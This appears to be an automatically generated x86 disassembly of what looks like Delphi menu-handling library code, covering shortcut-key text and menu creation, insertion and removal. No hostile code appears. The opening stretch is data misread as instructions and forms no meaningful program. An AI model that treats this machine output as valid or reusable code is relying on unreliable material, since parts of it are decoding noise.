inc ecx
jne r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0xc065646f
sbb [ ecx ] eax
sub al 0x70
sbb [ ecx ] al
xor [ eax ] al
add bh bh
clc
inc ebp
add al dh
pushad
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080007 ] al
add [ eax ] al
add al 0x0
or eax [ ecx + 0x75 ]
je r-xdata
add [ eax ] al
outsb
jne r-xdata
je r-xdata
rcl al 0x1d
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ah
sbb eax 0x140045
add [ eax ] al
mov al 0x1f
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
inc eax
add [ ebp + esi + 0x35a00040 ] bl
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
inc eax
add al bh
xor al [ eax ]
add [ eax - 0x73ffbee1 ] dh
xor eax 0x35980040
outsb
adc [ eax ] al
inc ecx
add [ eax ] al
imul esp [ edi + 0x6e ] 0x746e656d
in al 0x11
inc ebp
inc ecx
insb
sbb eax [ ebp ]
mov esp 0x10004517
add [ 0x756e654d ] al
jae r-xdata
add eax [ eax ]
or [ ecx + 0x6c ] eax
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bl
sbb [ ebp ] eax
pushad
add [ eax ] al
jmp [ eax ]
sub_451e88
push ebx
push esi
push edi
mov edi eax
xor esi esi
mov eax edi
call sub_440dc8
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
retn
push 0x0
mov edx edi
xor ecx ecx
mov eax ebx
call sub_446670
mov esi eax
test esi esi
jne r-xdata
mov esi ebx
sub_451ee0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x3 ] dl
mov [ ebp - 0x2 ] ax
xor eax eax
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov ax [ ebp - 0x2 ]
test [ ebp - 0x3 ] 0x1
je r-xdata
test [ ebp - 0x3 ] 0x4
je r-xdata
add ax 0x2000
test [ ebp - 0x3 ] 0x2
je r-xdata
add ax 0x4000
add ax 0x8000
sub_451f18
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
mov ebx edx
mov [ ebp - 0x2 ] ax
mov eax ebx
call sub_404094
push 0x0
xor eax eax
mov al [ ebp - 0x2 ]
push eax
call MapVirtualKeyA
shl eax 0x10
test eax eax
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x100
lea edx [ ebp - 0x102 ]
push edx
push eax
call GetKeyNameTextA
mov eax ebx
lea edx [ ebp - 0x102 ]
mov ecx 0x100
call sub_404304
sub_451f6c
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov [ ebp - 0x2 ] ax
xor eax eax
push ebp
push sub_452155
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl [ ebp - 0x2 ]
xor eax eax
mov al bl
cmp eax 0x2d
jge r-xdata
cmp eax 0x41
jge r-xdata
add eax 0xfffffff8
sub eax 0x2
jb r-xdata
add eax 0xffffffbf
sub eax 0x1a
jb r-xdata
add eax 0xffffffd3
sub eax 0x2
jb r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_40412c
jmp r-xdata
sub eax 0x3
je r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x41
add edx 0x41
call sub_40427c
jmp r-xdata
add eax 0xfffffffb
sub eax 0xa
jb r-xdata
lea eax [ ebp - 0x8 ]
add bl 0xd
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_40412c
jmp r-xdata
dec eax
sub eax 0xa
jb r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ rw-data ]
call sub_40412c
jmp r-xdata
sub eax 0xe
je r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x60
add edx 0x30
call sub_40427c
jmp r-xdata
add eax 0xfffffffa
sub eax 0x18
jb r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x30
add edx 0x30
call sub_40427c
jmp r-xdata
jmp r-xdata
mov eax esi
call sub_404094
mov eax esi
call sub_404094
test [ ebp - 0x1 ] 0x20
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ rw-data ]
call sub_40412c
jmp r-xdata
add eax 0xfffffffb
sub eax 0x9
jb r-xdata
xor eax eax
mov al bl
sub eax 0x6f
lea edx [ ebp - 0xc ]
call sub_408200
mov ecx [ ebp - 0xc ]
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_4043a0
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov ax [ ebp - 0x2 ]
call sub_451f18
test [ ebp - 0x1 ] 0x40
je r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_40435c
lea eax [ ebp - 0x8 ]
add bl 0x4
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_40412c
jmp r-xdata
jmp r-xdata
test [ ebp - 0x1 ] 0x80
je r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_40435c
mov eax esi
mov edx [ ebp - 0x8 ]
call sub_40435c
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_40435c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45215c
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_4040b8
retn
sub_452170
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ esi ]
call sub_404354
push eax
mov eax edi
call sub_404354
pop edx
cmp edx eax
jl r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_404354
push eax
mov eax edi
call sub_404554
push eax
mov eax [ esi ]
call sub_404554
pop edx
pop ecx
call sub_4080e0
test eax eax
jne r-xdata
mov bl 0x1
mov eax edi
call sub_404354
mov ecx eax
mov eax esi
mov edx 0x1
call sub_4045f4
sub_4521cc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_404544
xor eax eax
push ebp
push sub_4522a7
push [ fs : eax ]
mov [ fs : eax ] esp
xor edi edi
xor esi esi
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_452170
test al al
je r-xdata
or si 0x2000
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_452170
test al al
je r-xdata
or si 0x4000
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_452170
test al al
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_452170
test al al
je r-xdata
or si 0x4000
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
or si 0x8000
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4522ae
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_4040b8
retn
mov bx 0x8
inc ebx
cmp bx 0x256
jne r-xdata
mov edi esi
or di bx
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_451f6c
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_408090
test eax eax
jne r-xdata
sub_4522e4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
test esi esi
je r-xdata
mov al [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x9 ] 0x0
jmp r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov eax esi
call sub_454884
cmp eax [ ebx ]
jg r-xdata
mov edx [ ebx ]
mov eax esi
call sub_454894
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x3f ]
mov edx [ ebp + 0x8 ]
cmp al [ edx - 0x1 ]
ja r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
push [ edx ]
call [ ebp - 0x8 ]
add esp 0x4
mov [ ebp - 0x9 ] al
inc [ ebx ]
sub_452344
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov edi edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
xor ebx ebx
xor esi esi
test edi edi
je r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax edi
call sub_454884
mov ebx eax
mov [ ebp - 0x16 ] 0x0
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_454884
mov esi eax
cmp [ ebp - 0x16 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx [ ebp - 0x10 ]
jg r-xdata
mov [ ebp - 0x1 ] 0xff
mov [ ebp - 0x15 ] 0xff
cmp ebx [ ebp - 0x10 ]
jle r-xdata
cmp esi [ ebp - 0x14 ]
jg r-xdata
cmp esi [ ebp - 0x14 ]
jle r-xdata
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_454894
mov al [ eax + 0x3f ]
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
cmp al [ ebp - 0x15 ]
ja r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_454894
mov al [ eax + 0x3f ]
mov [ ebp - 0x15 ] al
mov al [ ebp - 0x15 ]
mov [ ebp - 0x1 ] al
push ebp
lea eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
call sub_4522e4
pop ecx
mov [ ebp - 0x16 ] al
jmp r-xdata
push ebp
lea eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x8 ]
mov edx edi
call sub_4522e4
pop ecx
mov [ ebp - 0x16 ] al
jmp r-xdata
cmp ebx [ ebp - 0x10 ]
jle r-xdata
cmp esi [ ebp - 0x14 ]
jle r-xdata
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_454894
mov al [ eax + 0x3f ]
cmp al [ ebp - 0x1 ]
jbe r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_454894
mov al [ eax + 0x3f ]
cmp al [ ebp - 0x1 ]
jbe r-xdata
inc [ ebp - 0x10 ]
jmp r-xdata
inc [ ebp - 0x14 ]
sub_452490
push ebx
mov ebx eax
mov eax ebx
call sub_44eb80
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4034f4
mov edx [ eax + 0x64 ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x30 ]
call sub_4573a0
test al al
jne r-xdata
mov al 0x1
pop ebx
retn
sub_4524c8
push ebx
mov ebx eax
mov eax ebx
call sub_44eb94
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4034f4
mov al [ eax + 0x69 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x38 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_4524f8
push ebx
mov ebx eax
mov eax ebx
call sub_44eba8
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4034f4
mov al [ eax + 0x6a ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x39 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_452528
push ebx
mov ebx eax
mov eax ebx
call sub_44ebd0
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4034f4
mov eax [ eax + 0x74 ]
mov edx [ ebx + 0x18 ]
cmp eax [ edx + 0x54 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_452558
push ebx
mov ebx eax
mov eax ebx
call sub_44ebf8
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4034f4
mov edx [ eax + 0x7c ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x58 ]
call sub_4044a0
je r-xdata
mov al 0x1
pop ebx
retn
sub_45258c
push ebx
mov ebx eax
mov eax [ ebx + 0x18 ]
cmp [ eax + 0x3d ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_44ebbc
test al al
je r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4034f4
mov eax [ eax + 0x6c ]
mov edx [ ebx + 0x18 ]
movzx edx [ edx + 0x3f ]
cmp eax edx
je r-xdata
mov al 0x1
pop ebx
retn
sub_4525c8
push ebx
mov ebx eax
mov eax ebx
call sub_44ec0c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4034f4
mov eax [ eax + 0x80 ]
mov edx [ ebx + 0x18 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_4525fc
push ebx
mov ebx eax
mov eax ebx
call sub_44ec20
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4034f4
mov ax [ eax + 0x84 ]
mov edx [ ebx + 0x18 ]
cmp ax [ edx + 0x60 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_452630
push ebx
mov ebx eax
mov eax ebx
call sub_44ec34
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4034f4
mov al [ eax + 0x86 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x3e ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_452664
push ebx
mov ebx eax
mov eax ebx
call sub_41a6a0
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x88 ]
mov edx [ ebx + 0x10 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_45268c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x78 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x18 ]
mov [ eax + 0xa8 ] bl
sub_4526ac
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_4546ec
sub_4526cc
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_45475c
sub_4526ec
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_4547b0
sub_45270c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov [ eax + 0x54 ] esi
sub_452728
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
add eax 0x58
mov edx esi
call sub_4040e8
sub_45274c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_4548dc
sub_45276c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x40 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_4548b8
sub_45278c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_4548cc
sub_4527ac
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x88 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x8c ] edx
sub_4527d8
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_419db0
mov [ ebx + 0x3e ] 0x1
mov [ ebx + 0x39 ] 0x1
mov [ ebx + 0x3b ] 0x2
mov [ ebx + 0x3c ] 0x2
call sub_4522c4
mov [ ebx + 0x50 ] ax
mov [ ebx + 0x40 ] 0xffffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov esi eax
mov [ ebx + 0x78 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_4551e8
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_452854
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_457184
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
mov eax esi
call sub_454884
test eax eax
jg r-xdata
mov edx esi
call sub_454c1c
xor eax eax
mov [ esi + 0x64 ] eax
jmp r-xdata
xor edx edx
mov eax esi
call sub_454894
call sub_403344
cmp [ esi + 0x34 ] 0x0
je r-xdata
mov eax [ esi + 0x5c ]
call sub_403344
lea eax [ esi + 0x44 ]
call sub_40d6a0
lea eax [ esi + 0x78 ]
call sub_40d6a0
mov ax [ esi + 0x50 ]
test ax ax
je r-xdata
xor edx edx
mov eax esi
call sub_452c70
mov eax [ esi + 0x34 ]
push eax
call DestroyMenu
mov eax [ esi + 0x4c ]
test eax eax
je r-xdata
movzx edx ax
xor ecx ecx
mov eax [ rw-data ]
call sub_4148cc
mov edx ebx
and dl 0xfc
mov eax esi
call sub_419dfc
test bl bl
jle r-xdata
call sub_403344
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_452908
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x1 ] cl
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_452b63
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x3e ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_452b6a
lea eax [ ebp - 0x40 ]
call sub_404094
lea eax [ ebp - 0x8 ]
call sub_404094
retn
lea eax [ ebp - 0x8 ]
mov edx [ ebx + 0x30 ]
call sub_40412c
mov eax ebx
call sub_454884
test eax eax
jle r-xdata
cmp [ ebx + 0x60 ] 0x0
je r-xdata
mov eax ebx
call sub_452e18
mov [ ebp - 0x25 ] eax
jmp r-xdata
call GetVersion
and eax 0xff
cmp ax 0x4
jb r-xdata
mov esi [ ebx + 0x64 ]
test esi esi
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx r-xdata
call sub_4044a0
sete al
and eax 0x7f
mov esi [ eax * 4 + rw-data ]
xor eax eax
mov al [ ebx + 0x48 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x38 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x39 ]
or eax [ edx * 4 + rw-data ]
or esi eax
or esi 0x400
mov eax ebx
call sub_454884
test eax eax
jle r-xdata
mov [ ebp - 0x39 ] 0x2c
mov [ ebp - 0x35 ] 0x3f
mov eax ebx
call sub_454e40
mov esi eax
test esi esi
je r-xdata
push [ ebp - 0x8 ]
push r-xdata
lea edx [ ebp - 0x40 ]
mov ax [ ebx + 0x60 ]
call sub_451f6c
push [ ebp - 0x40 ]
lea eax [ ebp - 0x8 ]
mov edx 0x3
call sub_404414
cmp [ esi + 0x64 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
call sub_404554
push eax
movzx eax [ ebx + 0x50 ]
push eax
push esi
push 0xffffffff
push edi
call InsertMenuA
mov eax [ ebx + 0x30 ]
call sub_404554
push eax
mov eax ebx
call sub_452e18
push eax
or esi 0x10
push esi
push 0xffffffff
push edi
call InsertMenuA
jmp r-xdata
cmp [ ebx + 0x4c ] 0x0
je r-xdata
cmp [ esi + 0x40 ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_4034d0
test al al
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x4c ]
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
mov al 0x1
mov eax ebx
call sub_45445c
test eax eax
jne r-xdata
mov [ ebp - 0x9 ] al
mov eax [ ebx + 0x30 ]
mov edx r-xdata
call sub_4044a0
sete al
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x3d ]
mov edx [ edx * 4 + rw-data ]
xor ecx ecx
mov cl [ ebx + 0x48 ]
or edx [ ecx * 4 + rw-data ]
or eax edx
xor edx edx
mov dl [ ebp - 0x1 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebp - 0x9 ]
or eax [ edx * 4 + rw-data ]
mov [ ebp - 0x31 ] eax
xor eax eax
mov al [ ebx + 0x38 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x39 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x3a ]
or eax [ edx * 4 + rw-data ]
mov [ ebp - 0x2d ] eax
movzx eax [ ebx + 0x50 ]
mov [ ebp - 0x29 ] eax
xor eax eax
mov [ ebp - 0x25 ] eax
xor eax eax
mov [ ebp - 0x21 ] eax
xor eax eax
mov [ ebp - 0x1d ] eax
mov eax [ ebp - 0x8 ]
call sub_404554
mov [ ebp - 0x15 ] eax
mov eax ebx
call sub_454884
test eax eax
jle r-xdata
lea eax [ ebp - 0x39 ]
push eax
push 0xffffffff
push 0xffffffff
push edi
call InsertMenuItemA
jmp r-xdata
mov eax ebx
call sub_452e18
mov [ ebp - 0x25 ] eax
sub_452b83
inc [ ecx ]
add [ eax ] al
add [ 0x55000000 ] ch
mov ebp esp
mov edx [ ebp + 0x8 ]
mov cl [ edx - 0x5 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x34 ]
call sub_452908
xor eax eax
pop ebp
retn
sub_452ba8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x70 ]
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x70 ]
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_45647c
test al al
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_455444
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_455940
mov [ ebp - 0x5 ] al
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax r-xdata
mov ecx [ ebp - 0x4 ]
call sub_452344
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov al 0x1
sub_452c18
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_452c62
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_418ee0
mov eax [ ebp - 0x4 ]
call sub_4521cc
mov edx eax
mov eax ebx
call sub_4548b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_452c69
lea eax [ ebp - 0x4 ]
call sub_404094
retn
sub_452c70
push ebx
mov ebx eax
test edx edx
je r-xdata
mov eax [ ebx + 0x68 ]
cmp edx eax
je r-xdata
test [ edx + 0x1c ] 0x8
jne r-xdata
pop ebx
retn
test eax eax
je r-xdata
mov eax edx
mov [ ebx + 0x68 ] eax
test eax eax
je r-xdata
xor ecx ecx
mov [ eax + 0x6c ] ecx
mov eax ebx
call sub_452ce8
mov [ eax + 0x6c ] ebx
mov edx ebx
call sub_419e80
sub_452cac
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_41a200
mov eax ebx
call sub_45486c
test eax eax
je r-xdata
cmp [ ebx + 0x74 ] 0x0
je r-xdata
mov eax ebx
call sub_45486c
mov edx eax
mov cl 0x1
mov eax ebx
mov si 0xffef
call sub_403540
pop esi
pop ebx
retn
mov eax ebx
call sub_452ce8
sub_452ce8
push ebx
push esi
push edi
push ebp
mov ebp eax
test [ ebp + 0x1c ] 0x8
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebp + 0x1c ] 0x2
je r-xdata
mov eax [ ebp + 0x6c ]
test eax eax
je r-xdata
mov [ ebp + 0x74 ] 0x1
jmp r-xdata
mov eax ebp
call sub_452e18
push eax
call GetMenuItemCount
mov esi eax
test esi esi
sete bl
test esi esi
jle r-xdata
call sub_452ce8
jmp r-xdata
test bl bl
je r-xdata
push 0x400
mov edi esi
dec edi
push edi
mov eax ebp
call sub_452e18
push eax
call GetMenuState
test al 0x4
jne r-xdata
cmp [ ebp + 0x64 ] 0x0
jne r-xdata
dec esi
test esi esi
jg r-xdata
push 0x400
push edi
mov eax ebp
call sub_452e18
push eax
call RemoveMenu
mov bl 0x1
mov eax ebp
call sub_452ba8
mov eax [ ebp + 0x70 ]
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
mov eax ebp
call sub_452e18
push eax
call GetMenuItemCount
test eax eax
jne r-xdata
mov eax [ ebp + 0x34 ]
push eax
call DestroyMenu
xor eax eax
mov [ ebp + 0x34 ] eax
jmp r-xdata
xor edx edx
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_452db8
push ebx
push esi
push edi
push ebp
push ecx
mov ebx ecx
mov [ esp ] edx
mov edi eax
mov eax edi
call sub_454884
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov edx ebp
mov eax edi
call sub_454894
cmp bl [ eax + 0x3f ]
jbe r-xdata
mov edx ebp
mov eax edi
call sub_454894
cmp bl [ eax + 0x3f ]
jae r-xdata
inc ebp
dec esi
jne r-xdata
mov edx ebp
mov eax edi
call sub_454894
mov [ eax + 0x3f ] bl
mov eax [ rw-data ]
call sub_451ec0
jmp r-xdata
cmp ebp [ esp ]
jge r-xdata
sub_452e18
push ebx
mov ebx eax
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
mov eax [ ebx + 0x34 ]
pop ebx
retn
mov eax [ ebx + 0x4 ]
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
call CreateMenu
mov [ ebx + 0x34 ] eax
call CreatePopupMenu
mov [ ebx + 0x34 ] eax
jmp r-xdata
mov eax ebx
call sub_452ba8
mov eax [ rw-data ]
call sub_451ec0
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
sub_452e64
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_41a128
push ebx
push sub_452c18
push 0x0
push 0x0
xor ecx ecx
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop esi
pop ebx
retn
sub_452ea8
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_45308c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_454e40
mov edi eax
test edi edi
je r-xdata
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
call sub_40412c
test bh 0x4
je r-xdata
mov eax edi
call sub_45647c
test al al
je r-xdata
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_4044a0
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
test bl 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov dl 0x1
call sub_41dae4
cmp [ esi + 0x3a ] 0x0
je r-xdata
test bh 0x4
jne r-xdata
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_40435c
mov eax [ ebp - 0xc ]
cmp [ eax ] 0x26
jne r-xdata
mov eax ebx
and eax 0x2
cmp eax 0x2
jne r-xdata
and ebx 0xffffffff
or ebx 0x2
jmp r-xdata
cmp [ esi + 0x39 ] 0x0
jne r-xdata
